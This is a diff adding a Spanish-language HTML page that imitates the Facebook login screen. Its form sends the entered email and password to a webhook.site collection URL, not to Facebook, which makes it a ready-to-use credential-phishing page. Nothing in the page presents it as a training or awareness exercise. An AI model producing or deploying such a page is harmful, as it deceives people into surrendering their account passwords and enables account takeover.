@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Inicio de sesión</title>
+  <style>
+    body {
+      background-color: #f0f2f5;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 50px;
+    }
+    .form-container {
+      background-color: white;
+      padding: 20px;
+      display: inline-block;
+      border-radius: 10px;
+      box-shadow: 0px 0px 10px #aaa;
+    }
+    input {
+      display: block;
+      width: 250px;
+      margin: 10px auto;
+      padding: 10px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+    button {
+      background-color: #1877f2;
+      color: white;
+      padding: 10px 25px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    small {
+      color: gray;
+    }
+  </style>
+</head>
+<body>
+  <div class="form-container">
+    <h2>Inicia sesión en Facebook</h2>
+    <form action="https://webhook.site/5fbb62cf-4342-4867-b913-81951f618be8" method="POST">
+      <input type="email" name="correo" placeholder="Correo electrónico o número" required>
+      <input type="password" name="clave" placeholder="Contraseña" required>
+      <button type="submit">Iniciar sesión</button>
+    </form>
+    <small>¿Olvidaste tu contraseña?</small>
+  </div>
+</body>
+</html>
